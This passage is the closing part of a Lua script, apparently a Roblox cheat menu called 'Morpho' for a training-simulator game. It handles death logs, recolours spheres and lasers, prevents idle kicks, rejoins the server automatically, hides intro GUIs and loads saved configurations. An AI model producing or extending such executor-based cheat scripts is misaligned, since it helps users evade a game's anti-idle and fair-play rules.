                        Library:Notify({ Title = "[LOGS]", Description = LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ") Dead", Time = 3 })
                    end
                    if Options.TypeOfLogs.Value["Console"] then
                        print("[LOGS]: " .. LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ") Dead")
                    end
                end
            end
        end)
    end)

    LocalPlayer.CharacterRemoving:Connect(function(Character)
        if Character:FindFirstChild("SPTS_Weight") then
            NetworkUtility:FireServer("RemoteEvent", { "EquipWeight_Request", 0 })
        end
        if Framework.Runtime.Connections.BallConnection then
            Framework.Runtime.Connections.BallConnection:Disconnect()
            Framework.Runtime.Connections.BallConnection = nil
        end
        if Framework.Runtime.Connections.BallJumpConnection then
            Framework.Runtime.Connections.BallJumpConnection:Disconnect()
            Framework.Runtime.Connections.BallJumpConnection = nil
        end
        Globals.States.PlayerPosition = Character.Humanoid.RootPart:GetPivot()
        Globals.States.CameraPosition = Camera:GetPivot()
    end)
end

do
    Storage.ChildAdded:Connect(function(Object)
        if Object.Name:match("EnergySphere") then
            if Toggles.CustomSpheres.Value then
                Object.Color = Options.CustomColor.Value
                Object.Transparency = 0
            elseif Toggles.RainbowSpheres.Value then
                RunService.PreRender:Wait()
                Framework.Runtime.Connections.RainbowConnection = RunService.PreRender:Connect(function()
                    if not Object or not Object.Parent then
                        Framework.Runtime.Connections.RainbowConnection:Disconnect()
                        return
                    end
                    Object.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
                    Object.Transparency = 0
                end)
            end
        elseif Object.Name == "Part" then
            if Toggles.CustomLasers.Value then
                Object.Color = Options.CustomColor.Value
                Object.Transparency = 0
            elseif Toggles.RainbowLasers.Value then
                RunService.PreRender:Wait()
                Framework.Runtime.Connections.RainbowConnection = RunService.PreRender:Connect(function()
                    if not Object or not Object.Parent then
                        Framework.Runtime.Connections.RainbowConnection:Disconnect()
                        return
                    end
                    Object.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
                    Object.Transparency = 0
                end)
            end
        end
    end)
end

do
    GuiService.ErrorMessageChanged:Connect(function()
        if setfpscap then
            setfpscap(Options.FpsCap.Value)
        end
        TeleportService:TeleportToPlaceInstance(PlaceIdentifier, JobIdentifier)
        return
    end)

    LocalPlayer.Idled:Connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)

    PlayerGui.IntroGui:GetPropertyChangedSignal("Enabled"):Connect(function()
        PlayerGui.IntroGui.Enabled = false
    end)

    LightingService.Blur:GetPropertyChangedSignal("Enabled"):Connect(function()
        LightingService.Blur.Enabled = false
    end)

    ScreenGui:GetPropertyChangedSignal("Enabled"):Connect(function()
        ScreenGui.Enabled = true
    end)

    UserInputService.WindowFocused:Connect(function()
        if not Toggles.ScreenOptimization.Value then
            ThreeDRenderingEnabled = true
            if setfpscap then
                setfpscap(Options.FpsCap.Value)
            end
            RunService:Set3dRenderingEnabled(true)
        end
    end)

    UserInputService.WindowFocusReleased:Connect(function()
        if not Toggles.ScreenOptimization.Value then
            ThreeDRenderingEnabled = false
            if setfpscap then
                setfpscap(45)
            end
            RunService:Set3dRenderingEnabled(false)
        end
    end)

    Library:OnUnload(function()
        if setfpscap then
            setfpscap(Options.FpsCap.Value)
        end
        TeleportService:TeleportToPlaceInstance(PlaceIdentifier, JobIdentifier)
        return
    end)
end

Loading:SetCurrentStep(6)
Loading:SetMessage("Loading Configurations")
Loading:SetDescription("Applying theme and save managers...")
task.wait(0.5)

ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)
SaveManager:SetIgnoreIndexes({ "MenuKeybind" })
ThemeManager:SetFolder("Morpho")
SaveManager:SetFolder("Morpho/" .. tostring(PlaceIdentifier))
SaveManager:SetSubFolder(tostring(PlaceIdentifier))
SaveManager:BuildConfigSection(Tabs.UiSettings.Tab)
ThemeManager:ApplyToTab(Tabs.UiSettings.Tab)
SaveManager:LoadAutoloadConfig()

Loading:SetCurrentStep(7)
Loading:SetMessage("Ready")
Loading:SetDescription("Morpho has been successfully loaded.")
task.wait(1.2)
Loading:Continue()

Library:Notify({ Title = "Successfully loaded", Description = "Welcome, " .. LocalPlayer.Name .. "!", Time = 3 })

getgenv().IsMorphoLoaded = true
